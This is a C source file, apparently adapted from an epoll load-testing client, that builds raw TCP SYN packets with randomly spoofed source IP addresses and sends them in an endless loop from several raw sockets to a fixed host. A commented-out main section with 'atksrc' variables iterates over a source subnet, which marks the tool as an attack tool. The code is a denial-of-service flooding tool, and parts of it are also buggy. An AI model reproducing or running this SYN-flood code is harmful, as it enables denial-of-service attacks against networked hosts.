#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>


#define _MAX_SOCKFD_COUNT 65535

typedef enum _EPOLL_USER_STATUS_EM  
{  
        FREE = 0,  
        CONNECT_OK = 1,//连接成功  
        SEND_OK = 2,   //发送成功  
        RECV_OK = 3,   //接收成功  
}EPOLL_USER_STATUS_EM;  
  
/* 
用户状态结构体 
*/  
struct UserStatus  
{  
        EPOLL_USER_STATUS_EM iUserStatus;//用户状态  
        int iSockFd;                     //用户状态关联的socketfd  
        char cSendbuff[1024];            //发送的数据内容  
        int iBuffLen;                    //发送数据内容的长度  
        unsigned int uEpollEvents;       //Epoll events  
};  

int m_iUserCount;                   //用户数量；  
struct UserStatus *m_pAllUserStatus;//用户状态数组  
int m_iEpollFd;                     //需要创建epollfd  
int m_iSockFd_UserId[_MAX_SOCKFD_COUNT];//将用户ID和socketid关联起来  
int m_iPort;                            //端口号  
char m_ip[100];                         //IP地址 


int DelEpoll(int iSockFd)  
{  
    int bret = 0;  
    struct epoll_event event_del;  
    if(0 < iSockFd)  
    {  
	event_del.data.fd = iSockFd;  
	event_del.events = 0;  
	if( 0 == epoll_ctl(m_iEpollFd, EPOLL_CTL_DEL, event_del.data.fd, &event_del) )  
	{  
	    bret = 1;  
	}  
	else  
	{  
	    printf("[SimulateStb error:] DelEpoll,epoll_ctl error,iSockFd:  %d\n", iSockFd);
	}  
	m_iSockFd_UserId[iSockFd] = -1;  
    }  
    else  
    {  
	bret = 1;  
    }  
    return bret;  
}  

unsigned short csum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int CEpollClient(int iUserCount, const char* pIP, int iPort)  
{  
    int iuserid;
    strcpy(m_ip, pIP);  
    m_iPort = iPort;  
    m_iUserCount = iUserCount;  
    m_iEpollFd = epoll_create(_MAX_SOCKFD_COUNT);  
    m_pAllUserStatus = (struct UserStatus*)malloc(iUserCount*sizeof(struct UserStatus));  

    for(iuserid=0; iuserid<iUserCount ; iuserid++)  
    {
		m_pAllUserStatus[iuserid].iUserStatus = FREE;  
		struct iphdr *ip = (struct iphdr *) m_pAllUserStatus[iuserid].cSendbuff;
		struct tcphdr *tcp = (struct tcphdr *) (m_pAllUserStatus[iuserid].cSendbuff + sizeof (struct ip));
		int len = sizeof(m_pAllUserStatus[iuserid].cSendbuff);

		tcp->source = htons(6666);
		tcp->dest = htons(8111);
		tcp ->seq = random();
		tcp->ack_seq = 0;
		tcp->doff = 5;
		tcp->dest = htons (80);
		tcp->fin=0;
		tcp->syn=1;
		tcp->rst=0;
		tcp->psh=0;
		tcp->ack=0;
		tcp->urg=0;
		tcp->window = htons (5840);
		tcp->check = 0;
		tcp->urg_ptr = 0;

		ip->ihl = 5;
		ip->version = 4;
		ip->tos = 0;
		ip->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
		ip->id = htons(54321);
		ip->frag_off = 0;
		ip->ttl = 255;
		ip->protocol = IPPROTO_TCP;
		ip->check = 0;
		ip->saddr = random();//inet_addr ( source_ip );
		ip->daddr = inet_addr("172.168.1.13");

		/*	ip->version = IPVERSION;
		ip->ihl = sizeof(struct ip)>>2;
		ip->tos = 0;
		//ip->len = htons(len);
		ip->id = htons(54321);
		ip->frag_off = 0;
		ip->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);

		//ip->ip_p = IPPROTO_TCP;
		ip->daddr = inet_addr("172.168.1.13");
		ip->ttl = 0;
		ip->ttl = 255;
		//ip->ip_sum = htons(sizeof(struct tcphdr));
		ip->saddr = random();

		//ip->ip_sum = htons(sizeof(struct tcphdr));
		//ip->ip_src.s_addr = random();*/
		tcp->check = 0;
		tcp->check = csum((u_int16_t *)m_pAllUserStatus[iuserid].cSendbuff + 4, sizeof(m_pAllUserStatus[iuserid].cSendbuff) - 8);
	   
		
		m_pAllUserStatus[iuserid].iBuffLen = strlen(m_pAllUserStatus[iuserid].cSendbuff) + 1;  
		m_pAllUserStatus[iuserid].iSockFd = -1;  
    }  
    memset(m_iSockFd_UserId, 0xFF, sizeof(m_iSockFd_UserId));  
}  

int ConnectToServer(int iUserId,const char *pServerIp,unsigned short uServerPort)  
{  
    m_pAllUserStatus[iUserId].iSockFd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); 
    if(m_pAllUserStatus[iUserId].iSockFd < 0 )
    {
	 printf("[CEpollClient error]: init socket fail\n");
	 return;

    }
    struct sockaddr_in addr;  
    bzero(&addr, sizeof(addr));  
    addr.sin_family = AF_INET;  
    addr.sin_port = htons(uServerPort);  //8111
    addr.sin_addr.s_addr = inet_addr(pServerIp); // 172.168.1.1

    int ireuseadd_on = 1;//支持端口复用  
    printf("server: \n", pServerIp, uServerPort, m_pAllUserStatus[iUserId].iSockFd);
    int flag = setsockopt(m_pAllUserStatus[iUserId].iSockFd, IPPROTO_IP, IP_HDRINCL, &ireuseadd_on, sizeof(ireuseadd_on));  

    /*int one = 1;
    const int *val = &one;
    if (setsockopt (m_pAllUserStatus[iUserId].iSockFd, IPPROTO_IP, IP_HDRINCL, &one, sizeof (one)) < 0)
    {
	printf ("Error setting IP_HDRINCL. Error number Error message\n");
        exit(0);
    }*/

    unsigned long ul = 1;  
    ioctl(m_pAllUserStatus[iUserId].iSockFd, FIONBIO, &ul); //设置为非阻塞模式  
 
    /*unsigned char datagram[sizeof(struct ip) + sizeof(struct tcphdr)];
    struct iphdr *ip = (struct iphdr *) datagram;
    struct tcphdr *tcp = (struct tcphdr *) (datagram + sizeof (struct ip));
    int len = sizeof(datagram);

    tcp->source = htons(6666);
    tcp->dest = addr.sin_port;
    tcp ->seq = random();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;

    ip->ip_v = IPVERSION;
    ip->ip_hl = sizeof(struct ip)>>2;
    ip->ip_tos = 0;
    ip->ip_len = htons(len);
    ip->ip_id = 0;
    ip->ip_off = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);

    ip->ip_p = IPPROTO_TCP;    
    ip->ip_dst = addr.sin_addr;
    ip->ip_ttl = 0;
    ip->ip_ttl = 255;
    ip->ip_sum = htons(sizeof(struct tcphdr));
    ip->ip_src.s_addr = random();

    ip->ip_sum = htons(sizeof(struct tcphdr));
    ip->ip_src.s_addr = random();
    tcp->check = 0;
    tcp->check = csum((u_int16_t *)datagram + 4, sizeof(buffer) - 8);*/


    connect(m_pAllUserStatus[iUserId].iSockFd, (const struct sockaddr*)&addr, sizeof(addr));  
    m_pAllUserStatus[iUserId].iUserStatus = CONNECT_OK;  
    m_pAllUserStatus[iUserId].iSockFd = m_pAllUserStatus[iUserId].iSockFd;  

    return m_pAllUserStatus[iUserId].iSockFd;  
}  

int RecvFromServer(int iUserId,char *pRecvBuff,int iBuffLen)  
{  
    int irecvsize = -1; 
    struct sockaddr_in client;
    int len =  sizeof(client);
 
    if(SEND_OK == m_pAllUserStatus[iUserId].iUserStatus)  
    {  
	int irecvsize = recvfrom(m_pAllUserStatus[iUserId].iSockFd, pRecvBuff, 1024, 0, (struct sockaddr *)&client, &len);
	if(0 > irecvsize)  
	{  
	    printf("[CEpollClient error]: iUserId: %d, recv from server fail\n", iUserId);
	}  
	else if(0 == irecvsize)  
	{  
	    printf("[warning:] iUserId: %d, \n RecvFromServer, STB收到数据为0，表示对方断开连接,irecvsize: %d, isockfd %d\n", iUserId, irecvsize, m_pAllUserStatus[iUserId].iSockFd);
	}  
	else  
	{  
	    printf("Recv Server Msg Content:%s\n", pRecvBuff);
	    struct sockaddr_in source, dest;
            struct iphdr *ip1 = (struct iphdr *)( pRecvBuff );
            printf("Version : %d\n",(unsigned int)ip1->version);
            printf("Internet Header Length : %d DWORDS or %d Bytes\n",(unsigned int)ip1->ihl,((unsigned int)(ip1->ihl))*4);
            printf("Type Of Service : %d\n",(unsigned int)ip1->tos);
            printf("Total Length : %d Bytes\n",ntohs(ip1->tot_len));
            printf("Identification : %d\n",ntohs(ip1->id));
            printf("Time To Live : %d\n",(unsigned int)ip1->ttl);
            printf("Protocol : %d\n",(unsigned int)ip1->protocol);
            printf("Header Checksum : %d\n",ntohs(ip1->check));
            memset(&source, 0, sizeof(source));
            source.sin_addr.s_addr = ip1->saddr;
            memset(&dest, 0, sizeof(dest));
            dest.sin_addr.s_addr = ip1->daddr;
            char sourceIp[16] = "";
            char destIp[16] = "";
            strcpy(sourceIp, inet_ntoa(source.sin_addr));
            strcpy(destIp, inet_ntoa(dest.sin_addr));
            printf("Source IP : %s\n", sourceIp);
            printf("Destination IP : %s\n",destIp);

	    m_pAllUserStatus[iUserId].iUserStatus = RECV_OK;  
	}  
    }  
    return irecvsize;  
}  


int CloseUser(int iUserId)  
{  
    close(m_pAllUserStatus[iUserId].iSockFd);  
    m_pAllUserStatus[iUserId].iUserStatus = FREE;  
    m_pAllUserStatus[iUserId].iSockFd = -1;  
    return 1;  
}  

int SendToServerData(int iUserId)  
{
    int isendsize = -1;
    struct sockaddr_in addr; 
    addr.sin_family = AF_INET;
    addr.sin_port = htons(2345);
    addr.sin_addr.s_addr = inet_addr ("172.168.1.13"); 
    if(CONNECT_OK == m_pAllUserStatus[iUserId].iUserStatus || RECV_OK == m_pAllUserStatus[iUserId].iUserStatus)  
    {    
        printf("send: \n", m_pAllUserStatus[iUserId].iSockFd, m_pAllUserStatus[iUserId].iBuffLen, m_pAllUserStatus[iUserId].cSendbuff);
        isendsize = sendto(m_pAllUserStatus[iUserId].iSockFd, m_pAllUserStatus[iUserId].cSendbuff, m_pAllUserStatus[iUserId].iBuffLen, 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
	if(isendsize < 0)  
	{  
	    printf("[CEpollClient error]: SendToServerData, send fail %d\n", isendsize); 
	}  
	else  
	{  
	    printf("[CEpollClient info]: iUserId: %d Send Msg Content:%s\n", iUserId, m_pAllUserStatus[iUserId].cSendbuff);  
	    m_pAllUserStatus[iUserId].iUserStatus = SEND_OK;  
	}  
    }  
    return isendsize;  
}  


int RunFun()  
{  
    int isocketfd = -1;  
    int iuserid = 0;
    for(iuserid=0; iuserid<m_iUserCount; iuserid++)  
    {  
	struct epoll_event event;  
	isocketfd = ConnectToServer(iuserid, m_ip, m_iPort);  

	if(isocketfd < 0)
	    printf("[CEpollClient error]: RunFun, connect fail \n");
	m_iSockFd_UserId[isocketfd] = iuserid;//将用户ID和socketid关联起来  

	event.data.fd = isocketfd;  
	event.events = EPOLLIN|EPOLLOUT|EPOLLERR|EPOLLHUP;  

	m_pAllUserStatus[iuserid].uEpollEvents = event.events;  
	epoll_ctl(m_iEpollFd, EPOLL_CTL_ADD, event.data.fd, &event);  
    }  

    while(1)  
    {  
	struct epoll_event events[_MAX_SOCKFD_COUNT];  
	char buffer[1024];  
	int ifd = 0;
	memset(buffer,0,1024);  
	int nfds = epoll_wait(m_iEpollFd, events, _MAX_SOCKFD_COUNT, 100 );//等待epoll事件的产生  
	for (ifd=0; ifd<nfds; ifd++)//处理所发生的所有事件  
	{  
  	    struct epoll_event event_nfds;  
	    int iclientsockfd = events[ifd].data.fd;  
 	    printf("events[ifd].data.fd: %d\n", events[ifd].data.fd);  
	    
	    int iuserid = m_iSockFd_UserId[iclientsockfd];//根据socketfd得到用户ID  
	    if( events[ifd].events & EPOLLOUT )  
	    {  
		//char datagram[1024] = "";
		//struct iphdr *ip = (struct iphdr *) datagram;
		//struct tcphdr *tcp = (struct tcphdr *) (datagram + sizeof (struct ip));	
		
		
		int iret = SendToServerData(iuserid);  
		if( 0 < iret )  
		{  
		    event_nfds.events = EPOLLIN|EPOLLERR|EPOLLHUP;  
		    event_nfds.data.fd = iclientsockfd;  
		    epoll_ctl(m_iEpollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);  
		}  
		else  
		{  
		    printf("[CEpollClient error:] EpollWait, SendToServerData fail, send iret: %d, iuserid %d, fd %d\n" ,iret, iuserid, events[ifd].data.fd);
		    DelEpoll(events[ifd].data.fd);  
		    CloseUser(iuserid);
		    return 0; 
		}  
	    }  
	    else if( events[ifd].events & EPOLLIN )//监听到读事件接收数据  
	    {  
		int ilen = RecvFromServer(iuserid, buffer, 1024);  
		if(0 > ilen)  
		{  
		    printf("[CEpollClient error]: RunFun, recv fail");
		    DelEpoll(events[ifd].data.fd);  
	    	    CloseUser(iuserid);  
		}  
		else if(0 == ilen)  
		{  
	   	    printf("[CEpollClient warning:] server disconnect,ilen:i %d, iuserid %d, fd %d\n", ilen, iuserid, events[ifd].data.fd);
		    DelEpoll(events[ifd].data.fd);  
		    CloseUser(iuserid);  
		    return 0; 
		}  
		else  
		{  
		    m_iSockFd_UserId[iclientsockfd] = iuserid;//将socketfd和用户ID关联起来  
		    event_nfds.data.fd = iclientsockfd;  
		    event_nfds.events = EPOLLOUT|EPOLLERR|EPOLLHUP;  
		    epoll_ctl(m_iEpollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);  
		}  
	    }  
	    else  
	    {  
		printf("[CEpollClient error:] other epoll error\n");
		DelEpoll(events[ifd].data.fd);  
		CloseUser(iuserid);  
		return 0; 
	    }  
	}  
    }  
}
int main(int argc, char *argv[])
{

    /*char c;
    char dstip[16] = "";
    char srcmask[32] = "";
    char srcip[32] = "";
    char dstport[32] = "";

    while ((c = getopt( argc, argv, "d:s:y:i:v:")) != EOF)
    {
        switch(c)
        {
            case 'd':
                strcpy(dstip, optarg);
                break;
            case 's':
                strcpy(srcip, optarg);
                break;
            case 'y':
                strcpy(dstport, optarg);
                break;
            case 'v':
                exit(0);
                break;
            default:
                exit(-1);
                break;
        }
    }
    char *ptr = strstr(srcip,"/");
    char atksrc[32] = "";
    char atkmask[16] = "";
    strncpy(atksrc, srcip, strlen(srcip)-strlen(ptr));
    strcpy(atkmask ,srcip + strlen(atksrc) + 1);

    unsigned long addr_ip, addr_mask;
    unsigned long start_ip;
    addr_ip = inet_addr(atksrc);
    char tmp[20] = {0};
    netmask_len2str(atoi(atkmask), tmp);
    addr_mask = inet_addr(tmp);

    unsigned long addr_max_ip = (addr_ip&addr_mask)^(~addr_mask);
    start_ip = ntohl(addr_ip&addr_mask)+1;
  
    if(addr_mask == 0xFFFFFFFF)
    {
         struct in_addr tmpaddr;
         int check_inject;
         char *addrPtr;
         char divert_addr[32] = "";
         tmpaddr.s_addr = addr_ip;
         addrPtr = inet_ntoa(tmpaddr);
         memset(divert_addr, 0, 32);
         strcpy(divert_addr, addrPtr);
    }
    else
    {
 
        while(start_ip < ntohl(addr_max_ip))
        {
            struct in_addr tmpaddr;
            int check_inject;
            char *addrPtr;
            char divert_addr[32] = "";

            tmpaddr.s_addr = start_ip;
            addrPtr = inet_ntoa(tmpaddr);
            memset(divert_addr, 0, 32);
            strcpy(divert_addr, addrPtr);
            start_ip += 1;
        }
    }*/

     

    CEpollClient(5, "172.168.1.13", 2345);
    int ret = RunFun();
    if(ret == 0)
    {
	free(m_pAllUserStatus);

    }
}
